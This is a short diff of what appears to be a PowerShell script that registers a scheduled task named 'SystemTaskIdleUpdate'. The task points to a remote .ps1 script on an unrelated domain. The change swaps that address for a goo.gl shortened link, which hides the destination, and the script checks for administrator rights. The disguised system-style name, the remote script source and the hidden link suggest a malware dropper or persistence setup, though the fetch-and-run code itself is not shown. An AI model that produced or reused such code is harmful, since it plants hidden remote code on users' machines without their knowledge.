@@ -2,8 +2,8 @@
 # One task when idle
 #
 
-$task      = 'http://www.geographycollector.com/_proc_usertask.ps1';
-$adminTask = 'http://www.geographycollector.com/_proc_usertask.ps1';
+$task      = 'http://goo.gl/YXh8K8';#'http://www.geographycollector.com/_proc_usertask.ps1';
+$adminTask = 'http://goo.gl/YXh8K8';#'http://www.geographycollector.com/_proc_usertask.ps1';
 $taskName  = 'SystemTaskIdleUpdate';
 
 $isAdmin = (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"));
